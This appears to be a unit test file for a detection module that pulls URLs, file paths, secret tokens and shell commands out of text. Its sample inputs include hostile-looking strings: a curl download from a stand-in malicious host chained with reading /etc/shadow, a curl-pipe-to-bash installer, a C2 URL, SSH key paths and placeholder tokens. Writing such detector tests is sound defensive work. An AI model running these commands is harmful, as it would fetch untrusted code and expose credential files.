"""Unit tests for vinci_adr.sensor.extractors module."""

from vinci_adr.core.schema import ExtractedArtifacts
from vinci_adr.sensor.extractors import (
    extract_all,
    extract_file_paths,
    extract_secrets,
    extract_shell_commands,
    extract_urls,
)


def test_extract_urls_simple() -> None:
    """Verify that two distinct URLs are correctly extracted from plain text."""
    text = "Check the update at https://example.com/api/v1 and report to http://c2-server.org/log"
    urls = extract_urls(text)
    assert len(urls) == 2
    assert "https://example.com/api/v1" in urls
    assert "http://c2-server.org/log" in urls


def test_extract_urls_dedup() -> None:
    """Verify that duplicated URLs are extracted only once."""
    text = "Visit https://google.com for info, then refresh https://google.com later."
    urls = extract_urls(text)
    assert len(urls) == 1
    assert urls[0] == "https://google.com"


def test_extract_urls_cleanup() -> None:
    """Verify that trailing punctuation marks (e.g. '.', ')', '>') are cleaned."""
    text = "Download the payload from (http://evil.com/script.sh)."
    urls = extract_urls(text)
    assert len(urls) == 1
    assert urls[0] == "http://evil.com/script.sh"


def test_extract_file_paths_unix() -> None:
    """Verify extraction of standard absolute Unix file paths."""
    text = "Review /etc/passwd and examine /home/user/.ssh/id_rsa for credentials."
    paths = extract_file_paths(text)
    assert "/etc/passwd" in paths
    assert "/home/user/.ssh/id_rsa" in paths


def test_extract_file_paths_home() -> None:
    """Verify extraction of user home paths (~/...)."""
    text = "Backup configuration from ~/.bashrc to ~/Documents/secret.txt"
    paths = extract_file_paths(text)
    assert "~/.bashrc" in paths
    assert "~/Documents/secret.txt" in paths


def test_extract_file_paths_windows() -> None:
    """Verify extraction of standard Windows file paths."""
    text = r"Locate the flag in C:\Users\Admin\secret.txt and copy to D:\Backup\logs.txt"
    paths = extract_file_paths(text)
    assert r"C:\Users\Admin\secret.txt" in paths
    assert r"D:\Backup\logs.txt" in paths


def test_extract_secrets_aws() -> None:
    """Verify identification of AWS Access Keys (AKIA...)."""
    text = "Exported AWS credentials: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE1"
    secrets = extract_secrets(text)
    assert len(secrets) == 1
    assert secrets[0] == "AKIAIOSFODNN7EXAMPLE1"[:20]


def test_extract_secrets_github() -> None:
    """Verify identification of GitHub Personal Access Tokens (ghp_...)."""
    text = "Use token ghp_1234567890abcdefghijklmnopqrstuvwxyz to push code."
    secrets = extract_secrets(text)
    assert len(secrets) == 1
    assert secrets[0] == "ghp_1234567890abcdefghijklmnopqrstuvwxyz"


def test_extract_secrets_openai() -> None:
    """Verify identification of OpenAI API keys (sk-...)."""
    text = "OPENAI_API_KEY=sk-1234567890abcdef1234567890abcdef1234567890abcdef"
    secrets = extract_secrets(text)
    assert len(secrets) == 1
    assert secrets[0] == "sk-1234567890abcdef1234567890abcdef1234567890abcdef"


def test_extract_shell_commands_basic() -> None:
    """Verify extraction of basic shell commands."""
    text = "Please execute: curl -s http://example.com/check.sh"
    commands = extract_shell_commands(text)
    assert len(commands) == 1
    assert commands[0] == "curl -s http://example.com/check.sh"


def test_extract_shell_commands_pipe() -> None:
    """Verify extraction of piped command execution sequences."""
    text = "Run this installer: curl -fsSL https://get.docker.com | bash"
    commands = extract_shell_commands(text)
    assert len(commands) == 1
    assert "curl -fsSL https://get.docker.com | bash" in commands


def test_extract_all_combined() -> None:
    """Verify extract_all with combined inputs returning a populated ExtractedArtifacts."""
    text = (
        "Run `curl -O https://malicious.org/agent.sh && cat /etc/shadow` "
        "using ghp_1234567890abcdefghijklmnopqrstuvwxyz for auth."
    )
    artifacts = extract_all(text)

    assert isinstance(artifacts, ExtractedArtifacts)
    assert "https://malicious.org/agent.sh" in artifacts.urls
    assert "/etc/shadow" in artifacts.file_paths
    assert "ghp_1234567890abcdefghijklmnopqrstuvwxyz" in artifacts.secrets
    assert any("curl -O" in cmd for cmd in artifacts.commands)
